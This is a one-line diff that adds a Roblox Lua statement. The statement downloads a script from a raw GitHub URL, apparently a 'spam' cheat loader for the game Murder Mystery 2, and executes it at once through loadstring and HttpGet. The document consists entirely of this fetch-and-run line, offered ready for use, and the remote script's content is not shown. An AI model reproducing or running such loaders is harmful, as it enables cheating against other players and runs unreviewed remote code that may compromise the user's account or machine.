@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/murder-mystery-2-spam3-xut4pmm0o6m7n4.lua"))()
